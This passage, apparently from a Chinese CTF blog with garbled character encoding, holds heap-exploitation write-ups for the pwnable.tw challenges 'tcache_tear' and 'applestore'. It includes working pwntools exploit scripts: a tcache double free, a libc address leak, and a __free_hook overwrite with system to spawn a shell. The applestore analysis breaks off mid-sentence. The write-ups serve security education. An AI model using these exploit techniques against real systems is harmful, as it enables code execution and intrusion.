é€»è¾‘\n\nmainä¸­sub_400948()å­˜åœ¨ä¸€ä¸ªalarmå®šæ—¶å‡½æ•°ï¼Œäºæ˜¯å°†å®ƒpatchæ‰ã€‚ï¼ˆEdit --> Patch program -->Assembleï¼Œå…¨éƒ¨patchä¸ºnopï¼‰\n\né€šè¿‡IDAåˆ†æTcache tearçš„æºç é€»è¾‘å¦‚ä¸‹ï¼š\n\n![](tcachetear1.png)\n\nè¿™é‡Œçš„æ¼æ´ç‚¹åœ¨num = 2çš„åˆ†æ”¯ä¸­ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n\n```c\n if ( v4 <= 7 )\n      {\n        free(ptr);\n        ++v4;\n      }\n// freeäº†å…¨å±€å˜é‡ptræŒ‡å‘çš„å †å†…å­˜ï¼Œä½†å¹¶æ²¡æœ‰å°†è¯¥æŒ‡é’ˆç½®NULLï¼Œå¯¼è‡´æ‚¬ç©ºæŒ‡é’ˆçš„äº§ç”Ÿã€‚\n```\n\næœ¬é¢˜é‡‡ç”¨çš„glibc 2.26 (ubuntu 17.10) ç‰ˆæœ¬ï¼Œä¸ºæå‡å †ç®¡ç†æ€§èƒ½ï¼Œèˆå¼ƒäº†å¾ˆå¤šå®‰å…¨æ£€æŸ¥ã€‚å¦‚ï¼Œå¯¹tcacheè€Œè¨€ï¼Œå¯ä»¥ä¸é—´éš”åœ°freeä¸¤ä¸ªç›¸åŒçš„å †ï¼Œå¹¶æ·»åŠ åˆ°tcacheé“¾è¡¨ä¸­ã€‚\n\næœ¬é¢˜ä¸­ï¼Œæ§åˆ¶Mallocçš„sizeåœ¨tcacheèŒƒå›´å†…ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯å½¢æˆä¸€ä¸ªç¯ï¼š\n\n```c\nMalloc(size,data);\nfree();\nfree();\n```\n\n![](tcachetear2.png)\n\nä¸‹æ¬¡mallocæ—¶ï¼Œtcacheå°†æœ€å³è¾¹çš„chunkè¿”å›ç»™ç”¨æˆ·ä½¿ç”¨ï¼Œç”¨æˆ·å¯ä»¥æ›´æ”¹å…¶ä¸­çš„æ•°æ®ï¼Œå¦‚chunkçš„fdéƒ¨åˆ†ã€‚é‚£ä¹ˆå½“å†ä¸€æ¬¡mallocæ—¶ï¼Œå°†å³æ•°ç¬¬äºŒä¸ªchunkï¼ˆè·Ÿä¸Šä¸€ä¸ªå®é™…æ˜¯åŒä¸€chunkï¼‰åˆ†é…ç»™ç”¨æˆ·ã€‚ä½†æ­¤æ—¶ç”±äºfdè¢«æ›´æ”¹ï¼Œä¸‹ä¸€æ¬¡malllocæ—¶ï¼Œå°±ä¼šåˆ†é…åˆ°fdä¸­æŒ‡å®šçš„åœ°å€ã€‚å› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥åœ¨æ–°åœ°å€ä¸­å†™ä¸€äº›æ•°æ®ï¼Œè¾¾åˆ°ä»»æ„åœ°å€å†™çš„ç›®çš„ã€‚\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è§¦å‘ä¸€ä¸‹è¿™ä¸ªæ¼æ´è¯•è¯•ï¼Œå®šä¸ªå°ç›®æ ‡ï¼Œå»ä¿®æ”¹å…¨å±€å˜é‡0x602060å¤„Global_nameçš„å€¼ã€‚\n\n\n\n## 1.3 æ¼æ´è§¦å‘ - ä»»æ„åœ°å€å†™\n\nåˆå§‹åŒ–æ—¶ï¼ŒGlobal_nameèµ‹å€¼ä¸ºxiayuanï¼Œæˆ‘çš„ç›®æ ‡æ˜¯æŠŠå®ƒæ”¹æˆwangyuxuanï¼Œä»£ç å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(p64(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.send('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.send('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.send('4')\n    \n# Global_name --> xiayuan\nmyproc.recvuntil('Name:')\nmyproc.sendline('xiayuan')\n\n# change Global_name --> wangyuxuan\nmy_malloc(200,'aaaaaaaaaa')\nmy_free()\nmy_free()\nmy_malloc(200,p64(0x602060))\nmy_malloc(200,'0')\nmy_malloc(200,'wangyuxuan')\n\ngdb.attach(myproc,'b * 0x00400c02 \\nc')\n\nmyproc.interactive()\n```\n\ngdbä¸­æŸ¥çœ‹Global_nameå¤„çš„å€¼ï¼ŒæˆåŠŸè¢«æ”¹\n\n```shell\ngefâ¤  x/s 0x602060\n0x602060:\t\"wangyuxuan\"\n```\n\n# 2 æ¼æ´åˆ©ç”¨\n\nå¾—åˆ°ä¸€ä¸ªä»»æ„åœ°å€å†™çš„æ¼æ´ï¼Œæˆ‘ä»¬é€šå¸¸æœ‰ä¸€ä¸‹å‡ ç§æ–¹å¼åˆ©ç”¨ï¼š\n\n- ä¿®æ”¹å‡½æ•°æŒ‡é’ˆ\n- ä¿®æ”¹gotè¡¨\n- fini_arrayæ®µå‡½æ•°æŒ‡é’ˆ\n- libcä¸­çš„å‡½æ•°æŒ‡é’ˆ\n\nåœ¨æœ¬é¢˜ä¸­ï¼š\n\n- ç¨‹åºæ²¡æœ‰è‡ªå·±çš„å‡½æ•°æŒ‡é’ˆ\n- gotè¡¨ä¸å¯å†™\n- è¿›å…¥mainå‡½æ•°åï¼Œä¸€ç›´å¤„äºwhileå¾ªç¯ï¼Œä¸ä¼šæ‰§è¡Œåˆ°fini_array\n\nå› æ­¤ï¼Œæˆ‘ä»¬åªèƒ½å»ä¿®æ”¹libcä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œéœ€è¦ï¼š\n\n- æ³„éœ²libcåŸºå€\n- åˆ©ç”¨libcä¸­çš„å‡½æ•°æŒ‡é’ˆ\n\n## 2.1 æ³„éœ²libcåŸºå€\n\nå‚è€ƒhacknoteä¸­ï¼Œunsorted binçš„ç‰¹æ€§ã€‚è¿™é‡Œéœ€è¦æ„é€ ä¸€ä¸ªä¼šè¢«å›æ”¶åˆ°unsorted binä¸­çš„chunkï¼Œç„¶åå°†chunkä¸­ç›¸åº”ä½ç½®çš„æ•°æ®ï¼ˆmain_arenaçš„topç»“æ„ä½“ï¼‰è¯»å‡ºï¼Œå‡å»å®ƒè·ŸlibcåŸºå€çš„åç§»ï¼Œå°±å¯ä»¥å¾—åˆ°libcåŸºå€ã€‚\n\nä¸€ä¸ªåˆèƒ½è¢«æˆ‘ä»¬å†™ï¼Œåˆèƒ½è¢«æˆ‘ä»¬è¯»çš„ä½ç½®ï¼Œå°±æ˜¯Global_nameå¤„ã€‚\n\nfreeæ—¶é™¤äº†æ£€æŸ¥å½“å‰å—ï¼Œè¿˜è¦æ£€æŸ¥nextchunkå’Œnextchunkçš„nextchunkã€‚å› æ­¤æ€»å…±éœ€è¦æ„é€ ä¸‰ä¸ªå—ã€‚\n\nå¤§å°åˆ†åˆ«ä¸º0x500ï¼ˆfreeæ—¶è¿›å…¥usorted binï¼‰, 0x20, 0x20ã€‚ä¸”éœ€è¦å°†ä»–ä»¬çš„inuseä½ç½®1ï¼Œä»¥é€šè¿‡æ£€æŸ¥ã€‚\n\n- main_arenaä¸­topç»“æ„ä½“è·ç¦»libcåŸºå€çš„åç§»ï¼š0x00007f762418fca0 - 0x00007f7623da4000 = 0x3ebca0\n\n![](tcachetear3.png)\n\næ³„éœ²libcåœ°å€çš„æºç å¦‚ä¸‹ï¼š\n\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(str(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('4')\n\nmyproc.recvuntil('Name:')\nmyproc.sendline(p64(0)+p64(0x501))\n\nmy_malloc(0x50,'a')\nmy_free()\nmy_free()\nmy_malloc(0x50,p64(0x602060 + 0x500))\nmy_malloc(0x50,'0')\nmy_malloc(0x50,(p64(0)+p64(0x21)+p64(0)+p64(0))*2)\n\nmy_malloc(0x70,'b')\nmy_free()\nmy_free()\nmy_malloc(0x70,p64(0x602060 + 0x10))\nmy_malloc(0x70,'0')\nmy_malloc(0x70,'b')\n\n# free, then get 'top' addr on 0x602060+0x10\nmy_free()\n\n# calc libc_addr\nmy_info()\nmyproc.recv('Name :')\nmyproc.recv(0x10)\nlibc_addr = u64(myproc.recv(0x8)) - 0x3ebca0\n\ngdb.attach(myproc,'b * 0x00400c02 \\nc')\n\nmyproc.interactive()\n```\n\n\n\n## 2.2 æ§åˆ¶libcä¸­çš„å‡½æ•°æŒ‡é’ˆ\n\nlibcä¸­å­˜åœ¨ä¸€äº›å¯¼å‡ºçš„hookå‡½æ•°æŒ‡é’ˆï¼š\n\n```shell\n$ strings libc-123.so | grep hook\n__malloc_initialize_hook\n_dl_open_hook\nargp_program_version_hook\n__after_morecore_hook\n__memalign_hook\n__malloc_hook\n__free_hook\n_dl_open_hook2\n__realloc_hook\n```\n\n[malloc hookåˆæ¢](https://www.jianshu.com/p/0d7aa3166eec)\n\næ ¹æ®è¿™äº›hookå‡½æ•°çš„ç‰¹æ€§ï¼ˆmallocä¹‹å‰ä¼šè°ƒç”¨`__malloc_hook`ï¼Œfreeä¹‹å‰ä¼šè°ƒç”¨`__free_hook`ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åŠ«æŒè¿™äº›å‡½æ•°æŒ‡é’ˆï¼Œæ¥æ‰§è¡Œsystemå‡½æ•°æˆ–è€…one_gadgetã€‚\n\n```shell\n$ one_gadget libc-123.so \n0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0x4f322 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  [rsp+0x40] == NULL\n\n0x10a38c execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n# 3 EXP\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf = ELF('tcache_tear')\nmylibc = ELF('libc-123.so')\nmyproc = process(myelf.path)\n\ndef my_malloc(size,data):\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('1')\n    myproc.recvuntil('Size:')\n    myproc.sendline(str(size))\n    myproc.recvuntil('Data:')\n    myproc.sendline(data)\n\ndef my_free():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('2')\n\ndef my_info():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('3')\n\ndef my_exit():\n    myproc.recvuntil('Your choice :')\n    myproc.sendline('4')\n\nmyproc.recvuntil('Name:')\nmyproc.sendline(p64(0)+p64(0x501))\n\nmy_malloc(0x50,'a')\nmy_free()\nmy_free()\nmy_malloc(0x50,p64(0x602060 + 0x500))\nmy_malloc(0x50,'0')\nmy_malloc(0x50,(p64(0)+p64(0x21)+p64(0)+p64(0))*2)\n\nmy_malloc(0x70,'b')\nmy_free()\nmy_free()\nmy_malloc(0x70,p64(0x602060 + 0x10))\nmy_malloc(0x70,'0')\nmy_malloc(0x70,'b')\n\n# free, then get 'top' addr on 0x602060+0x10\nmy_free()\n\n# calc libc_addr\nmy_info()\nmyproc.recvuntil('Name :')\nmyproc.recv(0x10)\nlibc_addr = u64(myproc.recv(0x8)) - 0x3ebca0\n\n# hijack __free_hook\nfree_hook = libc_addr + mylibc.symbols['__free_hook']\nsystem_addr = libc_addr + mylibc.symbols['system']\n# 1ã€å°†free_hookæ‰€åœ¨åœ°å€çš„å€¼è¦†ç›–ä¸ºsystemå‡½æ•°çš„åœ°å€å€¼\nmy_malloc(0x90,'b')\nmy_free()\nmy_free()\nmy_malloc(0x90,p64(free_hook))\nmy_malloc(0x90,'0')\nmy_malloc(0x90,p64(system_addr))\n# 2ã€ä½¿void *ptræŒ‡å‘â€œ/bin/shâ€ï¼Œåç»­free(ptr)æ—¶ç›¸å½“äºæ‰§è¡Œsystem(\"/bin/sh\")\nmy_malloc(0x80,'/bin/sh\\x00')\n\nmy_free()\n# gdb.attach(myproc,'b * 0x00400c02 \\nc')\nmyproc.interactive()\n```\n\n\n\n\n\n\n\n\n\n\n\n","tags":["heap","tcache"],"categories":["CTF"]},{"title":"pwnable.twä¹‹applestore","url":"/2020/03/07/applestore/","content":"\n[applestoreé¢˜ç›®é“¾æ¥](https://pwnable.tw/challenge/#7)\n\nè¿™æ˜¯ä¸€é“æˆ‘çœ‹ç€çœ‹ç€æƒ³å“­çš„é¢˜ç›®ï¼ŒçœŸçš„å¤ªç»•äº†ã€‚\n\n# 1 åˆ†æ\n\n## 1.1 linuxä¸‹æŸ¥çœ‹äºŒè¿›åˆ¶ä¿¡æ¯\n\n```shell\n$ file applestore\napplestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped\n\n$ checksec applestore\n[*] '/mnt/hgfs/vmshare/applestore/applestore'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\nå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š\n\n- 32ä½äºŒè¿›åˆ¶ç¨‹åºï¼ŒåŠ¨æ€é“¾æ¥ï¼Œæ²¡æœ‰å»ç¬¦å·è¡¨\n- gotè¡¨å¯å†™\n- å¼€å¯æ ˆä¸å¯æ‰§è¡Œï¼Œå¹¶æœ‰canary\n- æ²¡æœ‰å¼€å¯åœ°å€éšæœºåŒ–\n\n## 1.2 IDAé€†å‘æºç é€»è¾‘\n\nmainå‡½æ•°ä¸­ï¼Œå‰ä¸¤ä¸ªå‡½æ•°æ—¶è®¾ç½®è¶…æ—¶çš„ï¼Œ60ç§’ç¨‹åºå°±timeoutäº†ã€‚\n\n- memsetå°†å…¨å±€å˜é‡mycartçš„16ä¸ªå­—èŠ‚å…¨éƒ¨åˆå§‹åŒ–ä¸º0ã€‚\n- menuå‡½æ•°ä¸­åšä¸€äº›ä¿¡æ¯æ‰“å°ã€‚ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæœ‰6ä¸ªé€‰é¡¹ã€‚\n- handlerå‡½æ•°ä¸­ä¼šè¿›è¡Œä¸€äº›å¤„ç†ã€‚å…¶ä¸­handlerå‡½æ•°æ˜¯é‡ç‚¹ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯¹å…¶ä¸­çš„æ¯ä¸ªå‡½æ•°è¯¦ç»†åˆ†æã€‚\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  signal(14, timeout);\n  alarm(0x3Cu);\n  memset(&myCart, 0, 0x10u);\n  menu();\n  return handler();\n}\n\nint menu()\n{\n  puts(\"=== Menu ===\");\n  printf(\"%d: Apple Store\\n\", 1);\n  printf(\"%d: Add into your shopping cart\\n\", 2);\n  printf(\"%d: Remove from your shopping cart\\n\", 3);\n  printf(\"%d: List your shopping cart\\n\", 4);\n  printf(\"%d: Checkout\\n\", 5);\n  return printf(\"%d: Exit\\n\", 6);\n}\n\nunsigned int handler()\n{\n  char which_phone; // [esp+16h] [ebp-22h]\n  unsigned int v2; // [esp+2Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  while ( 1 )\n  {\n    printf(\"> \");\n    fflush(stdout);\n    my_read(&which_phone, 0x15u);\n    switch ( atoi(&which_phone) )\n    {\n      case 1:\n        list();                                 // apple store\n        break;\n      case 2:\n        add();                                  // Add into your shopping cart\n        break;\n      case 3:\n        delete();                               // Remove from your shopping cart\n        break;\n      case 4:\n        cart();                                 // List your shopping cart\n        break;\n      case 5:\n        checkout();                             // Checkout\n        break;\n      case 6:\n        puts(\"Thank You for Your Purchase!\");   // Exit\n        return __readgsdword(0x14u) ^ v2;\n      default:\n        puts(\"It's not a choice! Idiot.\");\n        break;\n    }\n  }\n}\n```\n\n### 1.2.1 list\n\nè¿™ä¸ªå‡½æ•°æ²¡ä»€ä¹ˆå¥½å…³æ³¨çš„ï¼Œå°±æ˜¯å¾ˆå¤šæ¡æ‰“å°ä¿¡æ¯ï¼Œå°†è‹¹æœå•†åº—é‡Œæœ‰çš„å•†å“åŠä»·æ ¼å±•ç¤ºç»™æˆ‘ä»¬ã€‚\n\n```c\nint list()\n{\n  puts(\"=== Device List ===\");\n  printf(\"%d: iPhone 6 - $%d\\n\", 1, 199);\n  printf(\"%d: iPhone 6 Plus - $%d\\n\", 2, 299);\n  printf(\"%d: iPad Air 2 - $%d\\n\", 3, 499);\n  printf(\"%d: iPad Mini 3 - $%d\\n\", 4, 399);\n  return printf(\"%d: iPod Touch - $%d\\n\", 5, 199);\n}\n```\n\n### 1.2.2 add\n\naddå‡½æ•°çš„ä¸»è¦é€»è¾‘æ˜¯å°†æˆ‘ä»¬é€‰æ‹©çš„å•†å“æ·»åŠ è¿›è´­ç‰©è½¦ã€‚æ­¤å‡½æ•°çœ‹ä¸Šå»æ¯”è¾ƒå¤šï¼Œæ¶‰åŠ5ä¸ªcaseåˆ†æ”¯ã€‚å®é™…åªéœ€å…³æ³¨createå’Œinsertä¸¤ä¸ªå‡½æ•°åŠŸèƒ½ã€‚\n\n```c\nunsigned int add()\n{\n  _DWORD *v1; // [esp+1Ch] [ebp-2Ch]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v3; // [esp+3Ch] [ebp-Ch]\n\n  v3 = __readgsdword(0x14u);\n  printf(\"Device Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  switch ( atoi(&nptr) )\n  {\n    case 1:\n      v1 = (_DWORD *)create(\"iPhone 6\", 199);\n      insert(v1);\n      goto LABEL_8;\n    case 2:\n      v1 = (_DWORD *)create(\"iPhone 6 Plus\", 299);\n      insert(v1);\n      goto LABEL_8;\n    case 3:\n      v1 = (_DWORD *)create(\"iPad Air 2\", 499);\n      insert(v1);\n      goto LABEL_8;\n    case 4:\n      v1 = (_DWORD *)create(\"iPad Mini 3\", 399);\n      insert(v1);\n      goto LABEL_8;\n    case 5:\n      v1 = (_DWORD *)create(\"iPod Touch\", 199);\n      insert(v1);\nLABEL_8:\n      printf(\"You've put *%s* in your shopping cart.\\n\", *v1);\n      puts(\"Brilliant! That's an amazing idea.\");\n      break;\n    default:\n      puts(\"Stop doing that. Idiot!\");\n      break;\n  }\n  return __readgsdword(0x14u) ^ v3;\n}\n```\n\n#### 1.2.2.1 create\n\ncreateå‡½æ•°ä¸­ç”³è¯·ä¸€ä¸ª16å­—èŠ‚å¤§å°çš„å †ï¼Œå¹¶å°†è¯¥å †å—åˆ†æˆ4ä»½ã€‚ç¬¬0~3å­—èŠ‚å­˜æ”¾asprintfç”³è¯·çš„å †ç©ºé—´åœ°å€ï¼ˆè¯¥æ–°ç”³è¯·çš„å †ä¸­å­˜æ”¾çš„æ˜¯æ‰‹æœºå‹å·çš„å­—ç¬¦ä¸²ï¼‰ã€‚ç¬¬4~7å­—èŠ‚å­˜æ”¾æ‰‹æœºçš„ä»·æ ¼ã€‚å‰©ä½™8ä¸ªå­—èŠ‚ç›®å‰å­˜æ”¾çš„æ˜¯0ã€‚éšåå°†è¿™ä¸ªå †å—çš„åœ°å€è¿”å›ç»™ä¸Šä¸€å±‚ï¼Œä¸Šä¸€å±‚å°†è¯¥åœ°å€ä¼ é€’ç»™insertã€‚\n\n```c\nchar **__cdecl create(int p_type, char *p_money)\n{\n  char **v2; // eax MAPDST\n\n  v2 = (char **)malloc(0x10u);\n  v2[1] = p_money;\n  asprintf(v2, \"%s\", p_type);\n  v2[2] = 0;\n  v2[3] = 0;\n  return v2;\n}\n```\n\ncreateçš„å †å—å’Œasprintfç”Ÿæˆçš„å †å—å…³ç³»å¦‚ä¸‹å›¾ï¼š\n\n![](applestore-1.png)\n\n#### 1.2.2.2 insert\n\ninsertå‡½æ•°ä¸­ï¼Œå°†ä¸Šä¸€æ­¥çš„å †å—å’Œå…¨å±€å˜é‡mycartè¿æ¥èµ·æ¥ï¼Œç»„æˆå¦‚ä¸‹å›¾1.2.2.2-1çš„å…³ç³»ã€‚\n\n```c\nint *__cdecl insert(int *info_loc)\n{\n  int *result; // eax\n  _DWORD *i; // [esp+Ch] [ebp-4h]\n\n  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )\n    ;\n  i[2] = info_loc;\n  result = info_loc;\n  info_loc[3] = (int)i;\n  return result;\n}\n```\n\nå›¾1.2.2.2-1\n\n![](applestore-2.png)\n\nå½“addç¬¬äºŒéƒ¨æ‰‹æœºè¿›è´­ç‰©è½¦çš„æ—¶å€™ï¼Œå°±ä¼šç”Ÿæˆå¦‚å›¾1.2.2.2-2çš„å…³ç³»ï¼š\n\n![](applestore-3.png)\n\nå¯ä»¥çœ‹å‡ºï¼Œæ·»åŠ è¿›è´­ç‰©è½¦çš„æ‰‹æœºä¿¡æ¯éƒ½è¢«ä¸²æˆäº†åŒé“¾è¡¨çš„å½¢å¼ã€‚å› æ­¤åç»­çš„deleteå’Œcartå°±æ˜¯åŒé“¾è¡¨åˆ é™¤å’Œéå†çš„æ“ä½œã€‚\n\n### 1.2.3 delete\n\ndeleteå‡½æ•°çš„åŠŸèƒ½ä¸»è¦æ˜¯ï¼Œæ ¹æ®æˆ‘ä»¬è¾“å…¥çš„ç¼–å·ï¼Œå°†è´­ç‰©è½¦ä¸­å¯¹åº”çš„å•†å“åˆ é™¤ã€‚\n\n```c\nunsigned int delete()\n{\n  signed int v1; // [esp+10h] [ebp-38h]\n  _DWORD *v2; // [esp+14h] [ebp-34h]\n  int v3; // [esp+18h] [ebp-30h]\n  int v4; // [esp+1Ch] [ebp-2Ch]\n  int v5; // [esp+20h] [ebp-28h]\n  char nptr; // [esp+26h] [ebp-22h]\n  unsigned int v7; // [esp+3Ch] [ebp-Ch]\n\n  v7 = __readgsdword(0x14u);\n  v1 = 1;\n  v2 = (_DWORD *)dword_804B070;\n  printf(\"Item Number> \");\n  fflush(stdout);\n  my_read(&nptr, 0x15u);\n  v3 = atoi(&nptr);\n  while ( v2 )\n  {\n    if ( v1 == v3 )\n    {\n      v4 = v2[2];\n      v5 = v2[3];\n      if ( v5 )\n        *(_DWORD *)(v5 + 8) = v4;\n      if ( v4 )\n        *(_DWORD *)(v4 + 12) = v5;\n      printf(\"Remove %d:%s from your shopping cart.\\n\", v1, *v2);\n      return __readgsdword(0x14u) ^ v7;\n    }\n    ++v1;\n    v2 = (_DWORD *)v2[2];\n  }\n  return __readgsdword(0x14u) ^ v7;\n}\n```\n\n### 1.2.4 cart\n\ncartå‡½æ•°çš„åŠŸèƒ½æ˜¯æ‰“å°æˆ‘ä»¬è´­ç‰©è½¦ä¸­å·²ç»å­˜åœ¨çš„å•†å“ï¼Œå¹¶ä¸”è®¡ç®—è´­ç‰©è½¦ä¸­å•†å“çš„æ€»é¢ï¼Œæœ€åå°†æ€»é¢è¿”å›ã€‚\n\n```c\nint cart()\n{\n  signed int v0; // eax\n  signed int v2; // [esp+18h] [ebp-30h]\n  int v3; // [esp+1Ch] [ebp-2Ch]\n  _DWORD *i; // [esp+20h] [ebp-28h]\n  char buf; // [esp+26h] [ebp-22h]\n  unsigned int v6; // [esp+3Ch] [ebp-Ch]\n\n  v6 = __readgsdword(0x14u);\n  v2 = 1;\n  v3 = 0;\n  printf(\"Let me check your cart. ok? (y/n) > \");\n  fflush(stdout);\n  my_read(&buf, 0x15u);\n  if ( buf == 'y' )\n  {\n    puts(\"==== Cart ====\");\n    for ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[2] )\n    {\n      v0 = v2++;\n      printf(\"%d: %s - $%d\\n\", v0, *i, i[1]);\n      v3 += i[1];\n    }\n  }\n  return v3;\n}\n```\n\n### 1.2.5 checkout\n\ncheckoutå‡½æ•°ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ç»“è´¦çš„åœ°æ–¹ã€‚ä¸è¿‡è¿™é‡Œä¸ç®¡ä½ ä¹°å¤šå°‘ï¼Œéƒ½åªä¼šè¾“å‡ºè®©ä½ ä¸‹æ¬¡å†ç»“è´¦çš„æç¤ºã€‚\n\nä¸è¿‡æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæœ‰ä¸ªifåˆ†æ”¯ã€‚å½“cartçš„è¿”å›å€¼ï¼ˆè´­ç‰©æ€»ä»·å€¼ï¼‰ä¸º7174ç¾å…ƒæ—¶ï¼Œå°±ä¼šå¼¹å‡ºä¸€ä¸ª\"ä¸€ç¾å…ƒä¹°iphone 8\"çš„æç¤ºã€‚å¹¶ä¸”è°ƒç”¨äº†asprintfå’Œinsertä¸¤ä¸ªå‡½æ•°ï¼Œå°†ä¸€ç¾å…ƒçš„iphoneåŠ å…¥è´­ç‰©è½¦åˆ—è¡¨ä¸­ï¼Œæœ€åå°†è´­ç‰©è½¦æ€»ä»·å€¼æ”¹ä¸º7175.\n\n```c\nunsigned int checkout()\n{\n  int v1; // [esp+10h] [ebp-28h]\n  char *v2; // [esp+18h] [ebp-20h]\n  int v3; // [esp+1Ch] [ebp-1Ch]\n  unsigned int v4; // [esp+2Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  v1 = cart();\n  if ( v1 == 7174 )\n  {\n    puts(\"*: iPhone 8 - $1\");\n    asprintf(&v2, \"%s\", \"iPhone 8\");\n    v3 = 1;\n    insert(&v2);\n    v1 = 7175;\n  }\n  printf(\"Total: $%d\\n\", v1);\n  puts(\"Want to checkout? Maybe next time!\");\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\nè¿™é‡Œæœ‰ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„ç‚¹ï¼Œè·Ÿaddå‡½æ•°ä¸­æ·»åŠ ä¸€éƒ¨æ‰‹æœºçš„æ“ä½œä¸ä¸€æ ·ã€‚\n\n- addå‡½æ•°ä¸­æ˜¯ç”³è¯·ä¸€å—å †å†…å­˜ç”¨äºå­˜æ”¾åŠ å…¥è´­ç‰©è½¦çš„æ‰‹æœºä¿¡æ¯\n- è€Œiphone 8çš„ä¿¡æ¯æ˜¯å­˜åœ¨æ ˆç©ºé—´V2å¤„çš„ï¼Œè€Œè¿™ä¸ªV2åˆä¼šè¢«åŠ å…¥åˆ°ä¹‹å‰çš„é“¾è¡¨ä¸­ã€‚å› æ­¤ä¸€ä¸ªæ ˆç©ºé—´åœ°å€è¢«å†™å…¥äº†å †ä¸­ï¼Œè€Œæ ˆæ˜¯ä¸æ–­åœ¨å˜åŒ–çš„ï¼Œå› æ­¤å°±å‡ºç°äº†ä¸€æ®µå¯èƒ½è¢«æ§åˆ¶çš„å†…å­˜ï¼Œå³V2é™„è¿‘ã€‚\n\nç”±ä»¥ä¸Šä»£ç ä¸­çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹å›¾æ‰€ç¤ºæ ˆç©ºé—´çš„å¸ƒå±€ï¼š\n\n![](applestore-4.png)\n\n#### æ¼æ´ç‚¹\n\n> checkouté‡Œå­˜æ”¾åœ¨æ ˆä¸Šçš„iphone 8ä¿¡æ¯å°±æ˜¯æœ¬é¢˜çš„æ¼æ´ç‚¹ï¼Œå› ä¸ºæ ˆçš„åœ°å€è¢«å†™å…¥äº†å †ä¸­ã€‚\n\nè¿™æ®µæ ˆç©ºé—´åœ¨checkoutå‡½æ•°è¿”å›åï¼Œä¼šè¢«å…¶ä»–å‡½æ•°ä½¿ç”¨ã€‚å› æ­¤å †ä¸­æŒ‡å‘çš„æ ˆç©ºé—´ä¿¡æ¯æ˜¯å¯èƒ½è¢«æˆ‘ä»¬ä»»æ„æ›´æ”¹çš„ã€‚\n\nè€Œæœ¬é¢˜æ°å¥½ç»™æˆ‘ä»¬æä¾›äº†ä¸¤ä¸ªå‡½æ•°ï¼šcartå’Œdeleteï¼Œåˆ†åˆ«ç”¨äºæ‰“å°å’Œåˆ é™¤ï¼ˆåœ¨é“¾è¡¨ä¸­æ‰§è¡Œunlinkæ“ä½œæ—¶å³ä»»æ„åœ°å€å†™ï¼‰ï¼Œå¯ä»¥è¢«æˆ‘ä»¬åˆ©ç”¨æ¥æ³„éœ²ä¿¡æ¯å’Œä»»æ„åœ°å€å†™é™å®šå€¼ï¼ˆæˆ–é™å®šåœ°å€å†™ä»»æ„å€¼ï¼‰ã€‚\n\n## 1.3 è§¦å‘æ¼æ´\n\nä¸ºäº†è§¦å‘æ¼æ´ï¼Œå¿…é¡»ä½¿checkoutçš„iphone 8åˆ†æ”¯è¢«æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯åœ¨æ‰§è¡Œcheckoutä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»addå¤Ÿæ­£å¥½7174ç¾å…ƒçš„æ‰‹æœºã€‚æ‰‹æœºæœ‰4ç§ä»·æ ¼ï¼š199, 299, 399, 